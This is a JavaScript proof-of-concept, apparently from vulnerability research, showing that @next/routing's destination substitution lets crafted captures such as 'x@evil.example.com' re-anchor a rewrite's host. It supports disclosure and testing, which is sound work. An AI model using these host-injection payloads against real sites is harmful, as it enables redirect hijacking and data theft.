/**
 * @next/routing@16.3.4 reimplements rewrite/redirect destination substitution
 * WITHOUT the encoding fix that CVE-2026-64645 forced into next's own
 * prepare-destination.ts.
 *
 *   next/src/shared/lib/router/utils/prepare-destination.ts  (FIXED in 16.2.11)
 *     destHostnameCompiler = safeCompile(destHostname, {
 *       validate: false,
 *       encode: encodeURIComponent,          // <-- the fix
 *     })
 *
 *   next-routing/src/destination.ts  (NO equivalent)
 *     result = result.replace(new RegExp(`\\$${name}`, 'g'), value ?? '')
 *
 * Raw substitution into an external destination lets a request-controlled
 * capture re-anchor the URL's host.
 */
import { pathToFileURL } from 'node:url'

const src = pathToFileURL(
  '/home/user/nextjs/packages/next-routing/src/destination.ts'
).href
const { replaceDestination, isExternalDestination, applyDestination } =
  await import(src)

function show(label, destination, groups) {
  const m = Object.assign([''], { groups })
  const out = replaceDestination(destination, m, {})
  let host = '(not external)'
  if (isExternalDestination(out)) {
    try {
      host = new URL(out).host
    } catch (e) {
      host = 'invalid URL: ' + e.message
    }
  }
  console.log(`  ${label}`)
  console.log(`    template : ${destination}`)
  console.log(`    capture  : ${JSON.stringify(groups)}`)
  console.log(`    result   : ${out}`)
  console.log(`    -> HOST  : ${host}`)
  console.log()
}

const TEMPLATE = 'https://$tenant.api.example.com/data'
console.log('@next/routing destination substitution\n')

show('benign', TEMPLATE, { tenant: 'acme' })
show('re-anchor with @ (credentials trick)', TEMPLATE, {
  tenant: 'x@evil.example.com',
})
show('re-anchor by closing host with /', TEMPLATE, {
  tenant: 'evil.example.com/',
})
show('re-anchor with #', TEMPLATE, { tenant: 'evil.example.com#' })
show('re-anchor with ?', TEMPLATE, { tenant: 'evil.example.com?' })
show('backslash', TEMPLATE, { tenant: 'evil.example.com\\' })

console.log('control: applyDestination on an external result')
const hijacked = replaceDestination(TEMPLATE, Object.assign([''], {
  groups: { tenant: 'x@evil.example.com' },
}), {})
console.log('  applyDestination ->',
  applyDestination(new URL('https://victim.test/t/x'), hijacked).href)
